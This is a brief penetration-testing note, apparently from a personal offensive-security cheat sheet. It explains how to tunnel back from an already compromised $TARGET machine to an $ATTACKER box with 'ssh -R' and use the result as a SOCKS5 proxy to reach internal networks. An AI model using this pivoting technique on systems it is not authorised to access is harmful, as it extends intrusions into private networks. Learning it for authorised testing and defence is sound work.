# Use SSH as a Proxy

You can use SSH as a SOCKS5 proxy (with a tool like proxychains) using remote port forwarding.

You need to already have access to a $TARGET machine. SSH from the $TARGET back to the $ATTACKER box:

```bash
ssh -R $PORT $USER@$ATTACKER
```

This will open up $PORT on $ATTACKER, which can then be used as a SOCKS5 proxy by applications on $ATTACKER. Useful for gaining access to machines on an internal network that may be visible to $TARGET but not $ATTACKER.

* [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
